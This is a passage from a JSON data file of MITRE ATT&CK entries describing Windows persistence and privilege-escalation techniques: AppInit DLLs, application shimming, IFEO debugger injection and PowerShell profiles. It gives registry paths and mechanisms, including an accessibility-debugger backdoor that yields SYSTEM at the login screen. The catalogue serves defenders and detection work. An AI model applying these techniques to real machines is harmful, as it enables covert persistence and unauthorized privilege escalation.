    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <!-- raw HTML omitted -->AppInit_DLLs<!-- raw HTML omitted --> value in the Registry keys <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> or <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. <!-- raw HTML omitted --><!-- raw HTML omitted -->The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Registry",
        "url": "https://support.microsoft.com/en-us/kb/197571",
        "description": "Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Secure Boot",
        "url": "https://msdn.microsoft.com/en-us/library/dn280412",
        "description": "Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd",
    "platform": "windows",
    "tid": "T1546.010",
    "technique": "AppInit DLLs",
    "tactic": "persistence",
    "datasources": "loaded-dlls|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <!-- raw HTML omitted -->AppInit_DLLs<!-- raw HTML omitted --> value in the Registry keys <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> or <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows<!-- raw HTML omitted --> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. <!-- raw HTML omitted --><!-- raw HTML omitted -->The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Registry",
        "url": "https://support.microsoft.com/en-us/kb/197571",
        "description": "Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "AppInit Secure Boot",
        "url": "https://msdn.microsoft.com/en-us/library/dn280412",
        "description": "Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83",
    "platform": "windows",
    "tid": "T1546.011",
    "technique": "Application Shimming",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. <!-- raw HTML omitted --><!-- raw HTML omitted -->A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->%WINDIR%\\AppPatch\\sysmain.sdb<!-- raw HTML omitted --> and<!-- raw HTML omitted -->* <!-- raw HTML omitted -->hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Custom databases are stored in:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom<!-- raw HTML omitted --> and<!-- raw HTML omitted -->* <!-- raw HTML omitted -->hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a> (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).<!-- raw HTML omitted --><!-- raw HTML omitted -->Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Application Shimming",
        "url": "http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf",
        "description": "Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hat 2015 App Shim",
        "url": "https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf",
        "description": "Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83",
    "platform": "windows",
    "tid": "T1546.011",
    "technique": "Application Shimming",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. <!-- raw HTML omitted --><!-- raw HTML omitted -->A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->%WINDIR%\\AppPatch\\sysmain.sdb<!-- raw HTML omitted --> and<!-- raw HTML omitted -->* <!-- raw HTML omitted -->hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->Custom databases are stored in:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom<!-- raw HTML omitted --> and<!-- raw HTML omitted -->* <!-- raw HTML omitted -->hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to <a href=\"https://attack.mitre.org/techniques/T1548/002\">Bypass User Account Control</a> (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).<!-- raw HTML omitted --><!-- raw HTML omitted -->Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.</p>\n",
    "technique_references": [
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Application Shimming",
        "url": "http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf",
        "description": "Ballenthin, W., Tomczak, J.. (2015). The Real Shim Shary. Retrieved May 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hat 2015 App Shim",
        "url": "https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf",
        "description": "Pierce, Sean. (2015, November). Defending Against Malicious Application Compatibility Shims. Retrieved June 22, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
    "platform": "windows",
    "tid": "T1546.012",
    "technique": "Image File Execution Options Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <!-- raw HTML omitted -->C:\\dbg\\ntsd.exe -g  notepad.exe<!-- raw HTML omitted -->). (Citation: Microsoft Dev Blog IFEO Mar 2010)<!-- raw HTML omitted --><!-- raw HTML omitted -->IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <!-- raw HTML omitted -->Debugger<!-- raw HTML omitted --> values in the Registry under <!-- raw HTML omitted -->HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&lt;executable&gt;<!-- raw HTML omitted --> where <!-- raw HTML omitted -->&lt;executable&gt;<!-- raw HTML omitted --> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)<!-- raw HTML omitted --><!-- raw HTML omitted -->IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit&lt;/code&gt;. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1546/008\">Accessibility Features</a>, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures “cmd.exe,” or another program that provides backdoor access, as a “debugger” for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with <a href=\"https://attack.mitre.org/techniques/T1021/001\">Remote Desktop Protocol</a> will cause the “debugger” program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malware may also use IFEO to <a href=\"https://attack.mitre.org/techniques/T1562\">Impair Defenses</a> by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Dev Blog IFEO Mar 2010",
        "url": "https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/",
        "description": "Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GFlags Mar 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview",
        "description": "Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Silent Process Exit NOV 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit",
        "description": "Marshall, D. & Griffin, S. (2017, November 28). Monitoring Silent Process Exit. Retrieved June 27, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe IFEO APR 2018",
        "url": "https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, April 10). Persistence using GlobalFlags in Image File Execution Options - Hidden from Autoruns.exe. Retrieved June 27, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FSecure Hupigon",
        "url": "https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml",
        "description": "FSecure. (n.d.). Backdoor - W32/Hupigon.EMV - Threat Description. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Ushedix June 2008",
        "url": "https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2",
        "description": "Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6",
    "platform": "windows",
    "tid": "T1546.012",
    "technique": "Image File Execution Options Injection",
    "tactic": "persistence",
    "datasources": "api-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <!-- raw HTML omitted -->C:\\dbg\\ntsd.exe -g  notepad.exe<!-- raw HTML omitted -->). (Citation: Microsoft Dev Blog IFEO Mar 2010)<!-- raw HTML omitted --><!-- raw HTML omitted -->IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <!-- raw HTML omitted -->Debugger<!-- raw HTML omitted --> values in the Registry under <!-- raw HTML omitted -->HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&lt;executable&gt;<!-- raw HTML omitted --> where <!-- raw HTML omitted -->&lt;executable&gt;<!-- raw HTML omitted --> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)<!-- raw HTML omitted --><!-- raw HTML omitted -->IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <!-- raw HTML omitted -->HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit&lt;/code&gt;. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1546/008\">Accessibility Features</a>, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures “cmd.exe,” or another program that provides backdoor access, as a “debugger” for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with <a href=\"https://attack.mitre.org/techniques/T1021/001\">Remote Desktop Protocol</a> will cause the “debugger” program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->Similar to <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a>, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malware may also use IFEO to <a href=\"https://attack.mitre.org/techniques/T1562\">Impair Defenses</a> by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Dev Blog IFEO Mar 2010",
        "url": "https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/",
        "description": "Shanbhag, M. (2010, March 24). Image File Execution Options (IFEO). Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GFlags Mar 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview",
        "description": "Microsoft. (2017, May 23). GFlags Overview. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Silent Process Exit NOV 2017",
        "url": "https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit",
        "description": "Marshall, D. & Griffin, S. (2017, November 28). Monitoring Silent Process Exit. Retrieved June 27, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe IFEO APR 2018",
        "url": "https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/",
        "description": "Moe, O. (2018, April 10). Persistence using GlobalFlags in Image File Execution Options - Hidden from Autoruns.exe. Retrieved June 27, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Tilbury 2014",
        "url": "http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/",
        "description": "Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "FSecure Hupigon",
        "url": "https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml",
        "description": "FSecure. (n.d.). Backdoor - W32/Hupigon.EMV - Threat Description. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec Ushedix June 2008",
        "url": "https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2",
        "description": "Symantec. (2008, June 28). Trojan.Ushedix. Retrieved December 18, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
    "platform": "windows",
    "tid": "T1546.013",
    "technique": "PowerShell Profile",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<!-- raw HTML omitted -->profile.ps1<!-- raw HTML omitted -->) is a script that runs when <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> starts and can be used as a logon script to customize user environments.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> supports several profiles depending on the user or host program. For example, there can be different profiles for <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> drives to gain persistence. Every time a user opens a <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> session the modified script will be executed unless the <!-- raw HTML omitted -->-NoProfile<!-- raw HTML omitted --> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft About Profiles",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6",
        "description": "Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Turla PowerShell May 2019",
        "url": "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/",
        "description": "Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wits End and Shady PowerShell Profiles",
        "url": "https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html",
        "description": "DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
    "platform": "windows",
    "tid": "T1546.013",
    "technique": "PowerShell Profile",
    "tactic": "persistence",
    "datasources": "file-monitoring|powershell-logs|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<!-- raw HTML omitted -->profile.ps1<!-- raw HTML omitted -->) is a script that runs when <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> starts and can be used as a logon script to customize user environments.<!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> supports several profiles depending on the user or host program. For example, there can be different profiles for <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> drives to gain persistence. Every time a user opens a <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a> session the modified script will be executed unless the <!-- raw HTML omitted -->-NoProfile<!-- raw HTML omitted --> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft About Profiles",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6",
        "description": "Microsoft. (2017, November 29). About Profiles. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Turla PowerShell May 2019",
        "url": "https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/",
        "description": "Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wits End and Shady PowerShell Profiles",
        "url": "https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html",
        "description": "DeRyke, A.. (2019, June 7). Lab Notes: Persistence and Privilege Elevation using the Powershell Profile. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd",
    "platform": "macos",
    "tid": "T1546.014",
